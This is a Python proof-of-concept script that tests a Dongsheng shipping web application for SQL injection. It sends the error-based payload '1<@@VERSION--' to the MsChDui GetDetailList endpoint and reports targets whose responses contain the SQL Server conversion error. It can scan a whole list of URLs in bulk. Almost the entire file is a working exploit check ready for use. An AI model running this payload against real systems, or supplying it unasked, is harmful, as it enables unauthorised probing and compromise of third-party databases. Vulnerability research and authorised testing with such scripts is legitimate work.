import requests
from requests import RequestException
import argparse

requests.packages.urllib3.disable_warnings()


def check(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded"
        }
    
    url = "/MvcShipping/MsChDui/GetDetailList"

    if not target.startswith("http"):
        target = f"http://{target}"

    try:
        resp = requests.post(target+url, headers=headers, data={"condition": "1<@@VERSION--"}, verify=False, timeout=30)
        if '在将 nvarchar 值' in resp.text and '转换成数据类型 int 时失败' in resp.text:
            print(f"{target} 存在漏洞")
    except RequestException as e:
        print(e)


def main(args):
    if args.file:
        try:
            with open(args.file, 'r') as f:
                file_content = f.readlines()
        except FileNotFoundError:
            print(f"Error: File '{args.file}' not found.")
            exit(1)
        for f in file_content:
            check(f.strip())
    else:
        check(args.url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser("Check Dongsheng MsChDuiController SQLi")
    parser.add_argument("-u", "--url", help="Test url")
    parser.add_argument("-f", "--file", help="Test Url File")

    args = parser.parse_args()
    main(args)